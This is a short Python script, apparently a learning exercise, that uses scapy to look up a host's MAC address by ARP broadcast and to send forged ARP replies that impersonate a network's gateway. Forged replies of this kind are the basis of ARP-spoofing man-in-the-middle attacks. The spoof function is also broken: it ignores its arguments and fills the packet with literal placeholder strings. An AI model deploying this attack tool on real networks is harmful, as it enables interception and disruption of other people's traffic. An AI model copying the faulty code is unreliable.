#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jan 28 02:14:38 2020
"""

import scapy.all as scapy

def get_mac(ip):
    # the next two lines creates a packet that asks for a specific ip
    arp_req_packet = scapy.ARP()
    arp_req_packet.pdst=ip
    # creating the broadcast MAC address packet
    broadcast_packet = scapy.Ether()
    broadcast_packet.dst = "ff:ff:ff:ff:ff:ff"
    # combining packets
    bc_arpreq_packet = broadcast_packet/arp_req_packet
    # sending and receiving packets, the answered ones and the unanswered. The timeout is necessary.  
    ans_list = scapy.srp(bc_arpreq_packet, timeout=1)[0]
    
    return ans_list[0][1].hwsrc


def spoof(target_ip, spoo_ip):
    # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
    packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
    scapy.send(packet)
    
